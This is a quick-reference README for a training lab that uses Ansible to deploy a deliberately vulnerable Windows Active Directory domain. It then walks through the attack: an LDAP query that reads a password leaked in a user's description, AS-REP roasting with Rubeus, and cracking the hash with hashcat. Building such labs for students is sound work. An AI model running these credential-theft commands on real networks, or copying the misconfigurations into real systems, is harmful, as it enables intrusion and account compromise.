# Quick Reference: Vulnerable AD Deployment with Ansible
Repository: https://github.com/jnl1479/Vulnerable-ActiveDirectory-Ansible

## 1. Project Overview
This lab deploys a Windows Server 2019 Active Directory environment (arasaka.com) pre-configured with realistic identity-based vulnerabilities. It is designed for cybersecurity students and red teamers to practice lateral movement and Kerberos-based credential theft.

### What is Deployed:
Domain Controller: A Windows Server 2019 instance running Active Directory.

Vulnerable User 1 (rbartmoss): An account with cleartext credentials leaked in its AD Description attribute.

Vulnerable User 2 (sarasaka): An account configured with UF_DONT_REQUIRE_PREAUTH, making it susceptible to AS-REP Roasting.

Automation: Full environmental setup via Ansible, including user creation and security policy degradation.

## 2. Deployment Summary
Deployment is automated via Ansible to ensure a consistent, repeatable "vulnerable" state.

### Prerequisites:
Control Node: Ubuntu 22.04 with Ansible 2.9+ and pywinrm installed.

Target Node: Windows Server 2019 (fresh install) with WinRM enabled.

Commands:
Bash
#### 1. Clone the repo
git clone https://github.com/jnl1479/Vulnerable-ActiveDirectory-Ansible.git
cd Vulnerable-ActiveDirectory-Ansible

#### 2. Configure target IP in inventory.yml
nano inventory.yml

#### 3. Execute the playbook
ansible-playbook -i inventory.yml main.yml

## 3. Exploitation Summary
The attack path follows a logical progression from unauthenticated enumeration to domain user compromise.

Phase 1: The rbartmoss Foothold (ADSI Enumeration)
Establish a null session to the DC and query LDAP attributes to find leaked credentials.

Command: ```powershell $Path = "LDAP://<DC_IP>/CN=rbartmoss,CN=Users,DC=arasaka,DC=com" ([ADSI]$Path).description

Goal: Recover the cleartext password for rbartmoss.

Phase 2: The sarasaka Escalation (AS-REP Roasting)
Use the rbartmoss session to perform an AS-REP Roast against the sarasaka account using Rubeus.

Command:

PowerShell
.\Rubeus.exe asreproast /user:sarasaka /domain:arasaka.com /format:hashcat /outfile:roast.txt
Phase 3: Offline Cracking (Hashcat)
Transfer the hash to a Linux machine and use a dictionary attack with the provided themed wordlist.

Command:

Bash
hashcat -m 18200 roast.txt cyberpunk_wordlist.txt --force
Goal: Recover the password Arasaka2077!.
